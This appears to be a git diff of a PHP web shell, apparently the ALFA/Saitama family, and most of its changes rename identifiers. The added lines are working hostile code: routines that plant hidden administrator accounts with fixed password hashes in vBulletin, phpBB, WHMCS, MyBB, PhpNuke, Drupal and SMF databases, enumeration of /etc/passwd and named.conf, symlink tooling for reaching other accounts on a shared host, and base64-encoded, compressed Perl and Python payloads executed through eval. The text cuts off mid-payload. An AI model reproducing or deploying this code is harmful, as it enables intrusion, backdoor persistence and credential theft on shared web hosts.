 echo __pre().'<center><center><div class="txtfont_header">| vBulletin |<div><p>'.getConfigHtml('vb').'</p><form onSubmit="g(\'pwchanger\',null,\'>>\',this.localhost.value,this.database.value,\'vb\',this.username.value,this.password.value,this.prefix.value,this.admin.value,this.email.value); return false;" method="POST">';
 $table = array('td1' =>
@@ -3995,14 +3996,14 @@ $table = array('td1' =>
 );
 create_table($table);
 echo '<p><input value=" " name="send" type="submit"></p></form></center>';
-if($_POST['saitama1'] && $_POST['saitama1'] == '>>'){
-$localhost = $_POST['saitama2'];
-$database = $_POST['saitama3'];
-$username = $_POST['saitama5'];
-$password = $_POST['saitama6'];
-$prefix = $_POST['saitama7'];
-$admin = $_POST['saitama8'];
-$SQL = $_POST['saitama9'];
+if($_POST['alfa1'] && $_POST['alfa1'] == '>>'){
+$localhost = $_POST['alfa2'];
+$database = $_POST['alfa3'];
+$username = $_POST['alfa5'];
+$password = $_POST['alfa6'];
+$prefix = $_POST['alfa7'];
+$admin = $_POST['alfa8'];
+$SQL = $_POST['alfa9'];
 $conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_connect_error());
 $pw_col = @mysqli_connect("SELECT column_name FROM information_schema.columns where table_name = '{$prefix}user' and column_name = 'password' and table_schema = '{$database}'");
 $pw_col = @mysqli_num_rows($pw_col);
@@ -4024,7 +4025,7 @@ if($solevisible){
 __alert('Success... '.$admin.' is created...');}
 }
 }
-if(isset($_POST['saitama5']) && $_POST['saitama5'] == 'phpbb'){
+if(isset($_POST['alfa5']) && $_POST['alfa5'] == 'phpbb'){
 
 echo __pre().'<center><div class="txtfont_header">| phpBB |</div><p><p>'.getConfigHtml('phpbb').'</p><form onSubmit="g(\'pwchanger\',null,\'>>\',this.localhost.value,this.database.value,this.username.value,\'phpbb\',this.password.value,null,this.admin.value,this.email.value,this.prefix.value); return false;" method="POST">';
 $table = array('td1' =>
@@ -4046,14 +4047,14 @@ $table = array('td1' =>
 );
 create_table($table);
 echo '<p><input value=" " name="send" type="submit"></p></form></center>';
-if ($_POST['saitama1'] && $_POST['saitama1'] == '>>'){
-$localhost = $_POST['saitama2'];
-$database = $_POST['saitama3'];
-$username = $_POST['saitama4'];
-$password = $_POST['saitama6'];
-$admin = $_POST['saitama8'];
-$SQL = $_POST['saitama9'];
-$prefix = $_POST['saitama10'];
+if ($_POST['alfa1'] && $_POST['alfa1'] == '>>'){
+$localhost = $_POST['alfa2'];
+$database = $_POST['alfa3'];
+$username = $_POST['alfa4'];
+$password = $_POST['alfa6'];
+$admin = $_POST['alfa8'];
+$SQL = $_POST['alfa9'];
+$prefix = $_POST['alfa10'];
 $conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
 $hash = md5('solevisible');
 $solevisible=@mysqli_query($conn,"UPDATE ".$prefix."users SET username_clean ='".$admin."' WHERE username_clean = 'admin'") or die(mysqli_error($conn));
@@ -4066,7 +4067,7 @@ __alert('Success... '.$admin.' is created...');
 }
 }
 }
-if(isset($_POST['saitama6']) && $_POST['saitama6'] == 'whmcs'){
+if(isset($_POST['alfa6']) && $_POST['alfa6'] == 'whmcs'){
 
 echo __pre().'<center><div class="txtfont_header">| Whmcs |</div><p><p>'.getConfigHtml('whmcs').'</p><form onSubmit="g(\'pwchanger\',null,\'>>\',this.localhost.value,this.database.value,this.username.value,this.password.value,\'whmcs\',null,this.admin.value,this.email.value); return false;" method="POST">';
 $table = array('td1' =>
@@ -4086,20 +4087,20 @@ $table = array('td1' =>
 );
 create_table($table);
 echo '<p><input value=" " name="send" type="submit"></p></form></center>';
-if ($_POST['saitama1'] && $_POST['saitama1'] == '>>'){
-$localhost = $_POST['saitama2'];
-$database = $_POST['saitama3'];
-$username = $_POST['saitama4'];
-$password = $_POST['saitama5'];
-$admin = $_POST['saitama8'];
-$SQL = $_POST['saitama9'];
+if ($_POST['alfa1'] && $_POST['alfa1'] == '>>'){
+$localhost = $_POST['alfa2'];
+$database = $_POST['alfa3'];
+$username = $_POST['alfa4'];
+$password = $_POST['alfa5'];
+$admin = $_POST['alfa8'];
+$SQL = $_POST['alfa9'];
 $conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
 $solevisible=@mysqli_query($conn,"insert into tbladmins (id,roleid,username,password,email,template,homewidgets) values(null,'1','".$admin."','d4a590caacc0be55ef286e40a945ea45','".$SQL."','blend','getting_started:true,orders_overview:true,supporttickets_overview:true,my_notes:true,client_activity:true,open_invoices:true,activity_log:true|income_overview:true,system_overview:true,whmcs_news:true,sysinfo:true,admin_activity:true,todo_list:true,network_status:true,income_forecast:true|')") or die(mysqli_error($conn));
 if($solevisible){
 __alert('Success... '.$admin.' is created...');}
 }
 }
-if(isset($_POST['saitama7']) && $_POST['saitama7'] == 'mybb'){
+if(isset($_POST['alfa7']) && $_POST['alfa7'] == 'mybb'){
 
 echo __pre().'<center><div class="txtfont_header">| Mybb |</div><p><p>'.getConfigHtml('mybb').'</p><form onsubmit="g(\'pwchanger\',null,\'>>\',this.localhost.value,this.database.value,this.username.value,this.password.value,null,\'mybb\',this.admin.value,this.email.value,this.prefix.value); return false;" method="POST">';
 $table = array('td1' =>
@@ -4121,21 +4122,21 @@ $table = array('td1' =>
 );
 create_table($table);
 echo '<p><input value=" " name="send" type="submit"></p></form></center>';
-if ($_POST['saitama1'] && $_POST['saitama1'] == '>>'){
-$localhost = $_POST['saitama2'];
-$database = $_POST['saitama3'];
-$username = $_POST['saitama4'];
-$password = $_POST['saitama5'];
-$admin = $_POST['saitama8'];
-$SQL = $_POST['saitama9'];
-$prefix = $_POST['saitama10'];
+if ($_POST['alfa1'] && $_POST['alfa1'] == '>>'){
+$localhost = $_POST['alfa2'];
+$database = $_POST['alfa3'];
+$username = $_POST['alfa4'];
+$password = $_POST['alfa5'];
+$admin = $_POST['alfa8'];
+$SQL = $_POST['alfa9'];
+$prefix = $_POST['alfa10'];
 $conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
 $solevisible=@mysqli_query($conn,"insert into ".$prefix."users (uid,username,password,salt,email,usergroup) values(null,'".$admin."','e71f2c3265619038d826a1ac6e2b9b8e','ywza68lS','".$SQL."','4')") or die(mysqli_error($conn));
 if($solevisible){
 __alert('Success... '.$admin.' is created...');}
 }
 }
-if(isset($_POST['saitama8']) && $_POST['saitama8'] == 'nuke'){
+if(isset($_POST['alfa8']) && $_POST['alfa8'] == 'nuke'){
 
 echo __pre().'<center><div class="txtfont_header">| PhpNuke |</div><p><p>'.getConfigHtml('phpnuke').'</p><form onsubmit="g(\'pwchanger\',null,\'>>\',this.localhost.value,this.database.value,this.username.value,this.password.value,null,this.admin.value,\'nuke\',this.email.value,this.prefix.value); return false;" method="POST">';
 $table = array('td1' =>
@@ -4157,14 +4158,14 @@ $table = array('td1' =>
 );
 create_table($table);
 echo '<p><input value=" " name="send" type="submit"></p></form></center>';
-if ($_POST['saitama1'] && $_POST['saitama1'] == '>>'){
-$localhost = $_POST['saitama2'];
-$database = $_POST['saitama3'];
-$username = $_POST['saitama4'];
-$password = $_POST['saitama5'];
-$admin = $_POST['saitama7'];
-$SQL = $_POST['saitama9'];
-$prefix = $_POST['saitama10'];
+if ($_POST['alfa1'] && $_POST['alfa1'] == '>>'){
+$localhost = $_POST['alfa2'];
+$database = $_POST['alfa3'];
+$username = $_POST['alfa4'];
+$password = $_POST['alfa5'];
+$admin = $_POST['alfa7'];
+$SQL = $_POST['alfa9'];
+$prefix = $_POST['alfa10'];
 $conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
 $hash = md5($pwd);
 $solevisible=@mysqli_query($conn,"insert into ".$prefix."_authors(aid,name,email,pwd) values('$admin','God','$SQL','d4a590caacc0be55ef286e40a945ea45')") or die(mysqli_error($conn));
@@ -4172,7 +4173,7 @@ if($solevisible){
 __alert('Success... '.$admin.' is created...');}
 }
 }
-if(isset($_POST['saitama9']) && $_POST['saitama9'] == 'drupal'){
+if(isset($_POST['alfa9']) && $_POST['alfa9'] == 'drupal'){
 
 echo __pre().'<center><div class="txtfont_header">| Drupal |</div><p><p>'.getConfigHtml('drupal').'</p><form onSubmit="g(\'pwchanger\',null,\'>>\',this.localhost.value,null,this.database.value,this.username.value,this.password.value,null,this.admin.value,\'drupal\'); return false;" method="POST">';
 $table = array('td1' =>
@@ -4190,12 +4191,12 @@ $table = array('td1' =>
  );
 create_table($table);
 echo '<p><input value=" " name="send" type="submit"></p></form></center>';
-if ($_POST['saitama1'] && $_POST['saitama1'] == '>>'){
-$localhost = $_POST['saitama2'];
-$database = $_POST['saitama4'];
-$username = $_POST['saitama5'];
-$password = $_POST['saitama6'];
-$admin = $_POST['saitama8'];
+if ($_POST['alfa1'] && $_POST['alfa1'] == '>>'){
+$localhost = $_POST['alfa2'];
+$database = $_POST['alfa4'];
+$username = $_POST['alfa5'];
+$password = $_POST['alfa6'];
+$admin = $_POST['alfa8'];
 $conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
 $getDescuid = @mysqli_query($conn,"select uid from users order by uid desc limit 0,1");
 $getDescuid = @mysqli_fetch_assoc($getDescuid);
@@ -4214,7 +4215,7 @@ __alert('Success... '.$admin.' is created...');}
 }
 }
 
-if(isset($_POST['saitama10']) && $_POST['saitama10'] == 'smf'){
+if(isset($_POST['alfa10']) && $_POST['alfa10'] == 'smf'){
 
 echo __pre().'<center><center><div class="txtfont_header">| SMF |</div><p><p>'.getConfigHtml('smf').'</p><form onSubmit="g(\'pwchanger\',null,\'>>\',this.localhost.value,this.database.value,null,this.username.value,this.password.value,this.prefix.value,this.admin.value,null,\'smf\'); return false;" method="POST">';
 $table = array('td1' =>
@@ -4234,13 +4235,13 @@ $table = array('td1' =>
  );
 create_table($table);
 echo '<p><input value=" " name="send" type="submit"></p></form></center>';
-if ($_POST['saitama1'] && $_POST['saitama1'] == '>>'){
-$localhost = $_POST['saitama2'];
-$database = $_POST['saitama3'];
-$username = $_POST['saitama5'];
-$password = $_POST['saitama6'];
-$prefix = $_POST['saitama7'];
-$admin = $_POST['saitama8'];
+if ($_POST['alfa1'] && $_POST['alfa1'] == '>>'){
+$localhost = $_POST['alfa2'];
+$database = $_POST['alfa3'];
+$username = $_POST['alfa5'];
+$password = $_POST['alfa6'];
+$prefix = $_POST['alfa7'];
+$admin = $_POST['alfa8'];
 $conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
 $setpwAlg = sha1(strtolower($admin) . 'solevisible');
 $solevisible=@mysqli_query($conn,"insert into {$prefix}members (id_member,member_name,id_group,real_name,passwd,email_address) values(null,'$admin','1','$admin','$setpwAlg','solevisible@fbi.gov')") or die(mysqli_error($conn));
@@ -4249,10 +4250,10 @@ __alert('Success... '.$admin.' is created...');}
 }
 }
 echo "</div>";
-saitamafooter();
+alfafooter();
 }
-function saitamaMakePwd(){
-	if(_saitama_file_exists("/etc/virtual/domainowners")||(_saitama_file_exists("/etc/named.conf")&&_saitama_file_exists("/etc/valiases"))){
+function alfaMakePwd(){
+	if(_alfa_file_exists("/etc/virtual/domainowners")||(_alfa_file_exists("/etc/named.conf")&&_alfa_file_exists("/etc/valiases"))){
 		return "/home/{user}/public_html/";
 	}
 	$document = explode("/", $_SERVER["DOCUMENT_ROOT"]);
@@ -4262,10 +4263,10 @@ function saitamaMakePwd(){
 	$path = implode("/", $document) . "/{user}/" . $public;
 	return $path;
 }
-function saitamaGetDomains($state = false){
+function alfaGetDomains($state = false){
 	$state = "named.conf";
 	$lines = array();
-	$lines = _saitama_file('/etc/named.conf');
+	$lines = _alfa_file('/etc/named.conf');
 	if(!$lines){
 		$lines = @scandir("/etc/valiases/");
 		$state = "valiases";
@@ -4273,81 +4274,81 @@ function saitamaGetDomains($state = false){
 			$lines = @scandir("/var/named");
 			$state = "named";
 			if(!$lines && $state){
-				$lines = _saitama_file('/etc/passwd');
+				$lines = _alfa_file('/etc/passwd');
 				$state = "passwd";
 			}
 		}
 	}
 	return array("lines" => $lines, "state" => $state);
 }
-function saitamaCreateParentFolder(){
-	$parent = $GLOBALS['home_cwd'] . "/" . __SAITAMA_DATA_FOLDER__;
+function alfaCreateParentFolder(){
+	$parent = $GLOBALS['home_cwd'] . "/" . __ALFA_DATA_FOLDER__;
 	if(!@is_dir($parent)){
 		@mkdir($parent, 0755, true);
 	}
 }
-function saitamasymlink(){
-saitamahead();
-saitamaNum(9,10);
-saitamaCreateParentFolder();
-@chdir($GLOBALS['home_cwd'] . "/" . __SAITAMA_DATA_FOLDER__);
+function alfasymlink(){
+alfahead();
+AlfaNum(9,10);
+alfaCreateParentFolder();
+@chdir($GLOBALS['home_cwd'] . "/" . __ALFA_DATA_FOLDER__);
 echo '<div class=header><br><center><div class="txtfont_header">| Symlink |</div><center><h3><a href=javascript:void(0) onclick="g(\'symlink\',null,null,\'symphp\')">| Symlink( php ) | </a><a href=javascript:void(0) onclick="g(\'symlink\',null,null,\'symperl\')">| Symlink( perl ) | </a><a href=javascript:void(0) onclick="g(\'symlink\',null,null,\'sympy\')">| Symlink( python ) | </a><a href=javascript:void(0) onclick="g(\'symlink\',null,null,null,null,\'SymFile\')">| File Symlink | </a></h3></center>';
-if(isset($_POST['saitama2'])&&($_POST['saitama2']=='symperl'||$_POST["saitama2"]=="sympy")){
-	$sympath = saitamaMakePwd();
-	@mkdir('cgisaitama',0755);
-	@chdir('cgisaitama');
-	saitamacgihtaccess('cgi');
-	$perl = '#!/usr/bin/perl   -I/usr/local/bandmin'."\n".'use MIME::Base64;use Compress::Zlib;my $SAITAMA_DATA="'.__SAITAMA_DATA_FOLDER__.'";eval(Compress::Zlib::memGunzip(decode_base64("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")));';
-	$py = '#!/usr/bin/python'."\nimport zlib, base64\nSAITAMA_DATA='".__SAITAMA_DATA_FOLDER__."'\n".'eval(compile(zlib.decompress(base64.b64decode("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")),\'<string>\',\'exec\'))';
-	$cginame = "symperl.saitama";
+if(isset($_POST['alfa2'])&&($_POST['alfa2']=='symperl'||$_POST["alfa2"]=="sympy")){
+	$sympath = alfaMakePwd();
+	@mkdir('cgialfa',0755);
+	@chdir('cgialfa');
+	alfacgihtaccess('cgi');
+	$perl = '#!/usr/bin/perl   -I/usr/local/bandmin'."\n".'use MIME::Base64;use Compress::Zlib;my $alfa_data="'.__ALFA_DATA_FOLDER__.'";eval(Compress::Zlib::memGunzip(decode_base64("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")));';
+	$py = '#!/usr/bin/python'."\nimport zlib, base64\nalfa_data='".__ALFA_DATA_FOLDER__."'\n".'eval(compile(zlib.decompress(base64.b64decode("eJydWN1z4jgSfzZ/hdZTWcOG2JC6vQdC2MrNTO6manfn6ib7lFAuYQvwjrFckgiwU3N/+3XrwxbgZKbOD1iW+lvdP7VQ4jDpEXiKTc2FItmqUAs9oUcxq+iiZP1Bj+0zVqtJL6iplL2eJVfFhrkxl24kD81QNMv1Lu/1ViVf0DKFMbklYei+t6I03x8+pW//+QHG97SUrKecdUd8ID6mYvX8OJ77i0aIVKJPyyVNc6rogFySMAFPcCYJGyeQq1H1ILas18vZkqyYQhX9mssBeFosGyJrEEwGgqmtqDyLNCGwIFWYF4JlKiRckD6XcU3VOi7ksoAYhglTWVLRDcvjjFfLcEBolZOWCngt0TMtCyqZTMLBwNMZJmu+YcmXrWTia1JvF2WRpWu1KcG1ALjBBBTHqudC8OoxfPfx7R+/vf/9If3Px48P4TyWdVkoUBEOYBs1NzAgX1zzGvY48MdO54V0Ci9kSC4I8sd/8qLqI/VgSIykgQnhhn5msAMZ31ZqSHK+oUU1JMg/JNkuR2/WStW42/ieJEl4iVtmKAc6lmasw/n4Cz7zEINg+aI/6TOVmShgI2nJBDi0YySjlSLLAuJpuOM4DgcRuCkKW